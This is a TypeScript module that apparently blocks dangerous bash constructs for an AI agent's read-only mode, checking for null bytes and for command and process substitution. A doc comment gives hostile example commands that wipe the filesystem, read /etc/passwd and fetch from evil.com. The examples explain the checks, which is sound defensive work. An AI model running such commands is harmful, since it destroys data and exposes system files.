/// <reference path="../../types/incr-regex-package.d.ts" />
import { debug } from "../../utils/debug.ts";
import type { MergedPermissionsConfig } from "../permissions-config.ts";
import { type ModeConfig, type CompiledBlockedCommandHint, type MismatchAnalysis } from "../mode-types.ts";

// ============================================================
// Tool Blocking Logic (Centralized)
// ============================================================

/**
 * Config type that works with both ModeConfig and MergedPermissionsConfig
 */
export type ToolCheckConfig = ModeConfig | MergedPermissionsConfig;

/**
 * Dangerous control characters that could cause issues at lower levels.
 *
 * Note: Newlines and carriage returns are NOT blocked because bash-parser
 * correctly handles them as command separators, and the AST validation
 * checks each command individually. Only null bytes are blocked as they
 * could cause issues with C bindings and string handling.
 */
export const DANGEROUS_CONTROL_CHARS = new Set([
  '\x00',  // Null byte - can truncate strings in some contexts
]);

/**
 * Check if a command contains dangerous control characters.
 *
 * @param command - The bash command to check
 * @returns true if command contains dangerous control chars, false if safe
 */
export function hasDangerousControlChars(command: string): boolean {
  for (const char of command) {
    if (DANGEROUS_CONTROL_CHARS.has(char)) {
      debug(`[Mode] Dangerous control character detected (code ${char.charCodeAt(0)}) in command`);
      return true;
    }
  }
  return false;
}

/**
 * Check if a command contains dangerous command/process substitution patterns.
 *
 * Detects:
 * - Command substitution: $(...) or `...` (backticks)
 * - Process substitution: <(...) or >(...)
 *
 * These are dangerous because they execute arbitrary commands:
 * - `ls $(rm -rf /)` - the rm runs during argument expansion
 * - `echo "$(cat /etc/passwd)"` - executes even inside double quotes
 * - `cat <(curl http://evil.com)` - process substitution runs curl
 *
 * Note: Single-quoted strings are safe: `echo '$(rm)'` is literal text
 *
 * @param command - The bash command to check
 * @returns true if command contains dangerous substitution, false if safe
 */
export function hasDangerousSubstitution(command: string): boolean {
  let inSingleQuote = false;
  let escaped = false;

  for (let i = 0; i < command.length; i++) {
    const char = command[i];
    const nextChar = command[i + 1];

    // Handle escape sequences (only outside single quotes)
    if (escaped) {
      escaped = false;
      continue;
    }

    if (char === '\\' && !inSingleQuote) {
      escaped = true;
      continue;
    }

    // Track single quote state (double quotes don't protect against substitution)
    if (char === "'" && !escaped) {
      inSingleQuote = !inSingleQuote;
      continue;
    }

    // Only check for dangerous patterns outside single quotes
    if (!inSingleQuote) {
      // Command substitution: $(
      if (char === '$' && nextChar === '(') {
        debug(`[Mode] Command substitution $() detected in: ${command}`);
        return true;
      }

      // Backtick command substitution
      if (char === '`') {
        debug(`[Mode] Backtick substitution detected in: ${command}`);
        return true;
      }

      // Process substitution: <( or >(
      if ((char === '<' || char === '>') && nextChar === '(') {
        debug(`[Mode] Process substitution detected in: ${command}`);
        return true;
      }
    }
  }

  return false;
}

// ============================================================
// Bash Rejection Reasons (Detailed error messages)
// ============================================================

/**
 * Pattern info for error messages - shows what patterns might have matched
 */
export interface RelevantPatternInfo {
  source: string;
  comment?: string;
}

/**
 * Detailed reason why a bash command was rejected in Explore mode.
 * Used to provide helpful error messages that explain exactly what was blocked and why.
 */
export type BashRejectionReason =
  | { type: 'control_char'; char: string; charCode: number; explanation: string }
  | { type: 'no_safe_pattern'; command: string; relevantPatterns: RelevantPatternInfo[]; mismatchAnalysis?: MismatchAnalysis; commandHint?: CompiledBlockedCommandHint }
  | { type: 'dangerous_operator'; operator: string; operatorType: 'chain' | 'redirect'; explanation: string }
  | { type: 'dangerous_substitution'; pattern: string; explanation: string }
  | { type: 'parse_error'; error: string }
  // New AST-based rejection types (from bash-validator)
  | { type: 'pipeline'; explanation: string }
  | { type: 'redirect'; op: string; explanation: string }
  | { type: 'command_expansion'; explanation: string }
  | { type: 'process_substitution'; explanation: string }
  | { type: 'parameter_expansion'; explanation: string }
  | { type: 'env_assignment'; explanation: string }
  | { type: 'unsafe_command'; command: string; explanation: string }
  | { type: 'compound_partial_fail'; failedCommands: string[]; passedCommands: string[] };

/**
 * Human-readable explanations for control characters.
 */
export const CONTROL_CHAR_EXPLANATIONS: Record<string, string> = {
  '\n': 'newline acts as command separator in bash (e.g., `safe\\ndangerous` runs both)',
  '\r': 'carriage return can act as command separator',
  '\x00': 'null byte can truncate strings and cause unexpected behavior',
};
